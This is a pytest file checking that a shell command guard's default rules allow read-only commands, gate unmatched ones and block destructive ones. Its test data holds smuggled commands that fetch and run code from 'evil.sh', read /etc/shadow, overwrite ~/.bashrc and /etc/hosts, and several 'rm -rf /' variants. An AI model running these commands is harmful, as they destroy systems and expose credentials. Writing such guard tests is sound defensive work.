"""Extra tests for seed_default_rules branches and seed pattern behavior."""

import re

import pytest

from shuttle.db.repository import RuleRepo
from shuttle.db.seeds import DEFAULT_SECURITY_RULES, seed_default_rules


@pytest.mark.asyncio
async def test_seed_default_rules_returns_zero_when_rules_exist(db_session):
    repo = RuleRepo(db_session)
    await repo.create(pattern="x", level="allow", priority=0)
    n = await seed_default_rules(db_session)
    assert n == 0


# ---------------------------------------------------------------------------
# Seed pattern behavior — mirrors CommandGuard evaluation (priority order,
# re.search, first match wins, no match → gate).
# ---------------------------------------------------------------------------


def _disposition(cmd: str) -> str:
    for rule in sorted(DEFAULT_SECURITY_RULES, key=lambda r: r["priority"]):
        if re.search(rule["pattern"], cmd):
            return rule["level"]
    return "gate"


@pytest.mark.parametrize(
    "cmd",
    [
        # chain smuggling
        "ls foo; rm -rf /tmp/x",
        "ls ; rm -rf /tmp/x",
        "ls x\nrm -rf /tmp",  # newline = second command
        # redirect smuggling
        "df -h > ~/.bashrc",
        "free -m > /etc/hosts",
        # command substitution smuggling
        "df -h $(rm -rf /tmp/x)",
        "df -h `rm -rf /tmp`",
        "docker inspect $(bash /tmp/evil.sh)",
        "docker logs `wget -qO- evil.sh`",
        "kubectl top pods $(bash evil.sh)",
        "which $(rm -rf /tmp/x)",
        "command -v $(curl evil.sh)",
        "ls -la $(cat /etc/shadow)",
    ],
)
def test_allow_rules_reject_shell_smuggling(cmd):
    """No allow rule may match a command with shell metacharacters."""
    assert _disposition(cmd) != "allow"


@pytest.mark.parametrize(
    "cmd",
    [
        "df -h",
        "df -hT /var",
        "free -m",
        "ls",
        "ls -la /var/www",
        "ls ~",
        "which python3",
        "which -a git",
        "command -v docker",
        "docker ps -a",
        "docker logs --tail 100 myapp",
        "docker inspect web",
        "kubectl get pods -n kube-system",
        "systemctl status nginx",
        "ip a",
        "ip route show",
        "ss -tulpn",
        "dpkg -l",
        "apt-cache search vim",
        "id -u",
        "date +%F",
        "uptime",
    ],
)
def test_legit_readonly_still_allowed(cmd):
    assert _disposition(cmd) == "allow"


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /",
        "rm -fr /",  # flag order variant
        "rm -r --force /",  # long options
        "rm -rf /*",
        "rm -fr /*",
        "rm -rf /usr",
        "rm -r --force /etc/passwd",
        "rm --no-preserve-root -rf /",
        "sudo rm -rf /",  # block rules are unanchored
        "rm -rf /boot ",
    ],
)
def test_rm_variants_blocked(cmd):
    assert _disposition(cmd) == "block"


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /tmp/x",  # benign target → gate, not block
        "ls -la {x..y}",  # brace expansion excluded from whitelist
        "dpkg -l vim*",  # glob excluded from whitelist
        "sudo df -h",  # allow rules are ^-anchored
        "ls | grep foo",  # pipe excluded
    ],
)
def test_nonmatching_falls_to_gate(cmd):
    assert _disposition(cmd) == "gate"
